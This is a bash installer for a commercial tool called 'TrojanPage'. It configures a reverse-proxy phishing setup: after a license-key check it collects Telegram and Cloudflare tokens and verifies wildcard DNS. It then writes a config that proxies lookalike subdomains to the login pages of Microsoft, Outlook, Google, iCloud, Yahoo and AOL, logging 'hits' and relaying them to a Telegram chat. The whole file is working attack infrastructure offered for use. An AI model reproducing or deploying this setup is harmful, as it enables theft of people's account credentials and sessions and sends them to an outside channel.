#!/bin/bash
# 🏛️ TROJANPAGE - FULL HANDSHAKE EDITION (V14.8.6)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. SYSTEM PREP ---
mkdir -p /root/db/
touch /root/db/used_tokens.txt
chmod 777 /root/db/used_tokens.txt
VPS_IP=$(curl -s https://api.ipify.org)

# --- 2. MASTER LICENSE CHECK ---
MASTER_KEY="TROJAN-PRO-2026"
show_header
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }

# --- 3. TELEGRAM VALIDATION ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -ne "${CYAN}[...] Validating Bot...${NC}\r"
    CHECK_TG=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
    if [[ $CHECK_TG == *"\"ok\":true"* ]]; then
        echo -e "${GREEN}[success] Telegram Handshake OK.   ${NC}"
        break
    else
        echo -e "${RED}[error] Invalid Bot Token. Try again.${NC}"
    fi
done
read -p "Enter Telegram Chat ID: " TG_ID

# --- 4. CLOUDFLARE API VALIDATION ---
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    echo -ne "${CYAN}[...] Validating Cloudflare Token...${NC}\r"
    # Verify the token is active
    CHECK_CF=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
         -H "Authorization: Bearer $CF_TOKEN" \
         -H "Content-Type:application/json")
    
    if [[ $CHECK_CF == *"\"status\":\"active\""* ]]; then
        echo -e "${GREEN}[success] Cloudflare Token Verified.${NC}"
        break
    else
        echo -e "${RED}[error] Cloudflare Token Rejected (Invalid or Expired).${NC}"
    fi
done

# --- 5. DNS PROPAGATION & WILDCARD CHECK ---
while true; do
    read -p "Enter Base Domain (e.g. martmo.click): " USER_DOMAIN
    USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
    echo -e "${CYAN}[...] Checking DNS Propagation for *.$USER_DOMAIN...${NC}"
    
    # Check if wildcard resolves to this VPS IP
    DNS_RESOLVE=$(dig +short "*.$USER_DOMAIN" | tail -n1)
    
    if [[ "$DNS_RESOLVE" == "$VPS_IP" ]]; then
        echo -e "${GREEN}[success] Wildcard DNS Propagated to $VPS_IP.${NC}"
        break
    else
        echo -e "${RED}[error] DNS Mismatch! *.$USER_DOMAIN points to [$DNS_RESOLVE].${NC}"
        echo -e "${YELLOW}Requirement: Set a Wildcard (*) A-Record in Cloudflare to $VPS_IP (DNS ONLY/Grey Cloud).${NC}"
        read -p "Press Enter to re-check DNS..."
    fi
done

# --- 6. TLS PRE-CHECK ---
echo -e "${CYAN}[...] Verifying TLS Compatibility...${NC}"
if [[ $(curl -s -I "http://$USER_DOMAIN" 2>&1) == *"443"* ]] || [ -d "/etc/letsencrypt/live/$USER_DOMAIN" ]; then
    echo -e "${GREEN}[success] TLS Handshake Ready.${NC}"
else
    echo -e "${YELLOW}[info] Fresh TLS Certificates will be issued by the engine upon first 'Run'.${NC}"
fi

read -p "Enter Path Slug: /" USER_SLUG
CLEAN_SLUG=$(echo "$USER_SLUG" | tr -dc 'a-zA-Z0-9')

# --- 7. FINAL DEPLOYMENT ---
# (PHP Gatekeeper and Config logic remain exact to V14.8.4/V14.8.5)
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "listeningPortHTTP": 8080,
  "target": "login.microsoftonline.com",
  "log": "/root/hits.json",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "cfToken": "$CF_TOKEN",
  "proxyRules": [
    {"hostname": "*.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.outlook.$USER_DOMAIN", "target": "outlook.live.com", "type": "proxy"},
    {"hostname": "*.gmail.$USER_DOMAIN", "target": "accounts.google.com", "type": "proxy"},
    {"hostname": "*.icloud.$USER_DOMAIN", "target": "www.icloud.com", "type": "proxy"},
    {"hostname": "*.yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"},
    {"hostname": "*.aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
  ]
}
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
echo -e "${GREEN}[success] Handshake Complete. Domain, DNS, and TLS Verified. Type 'Run'.${NC}"
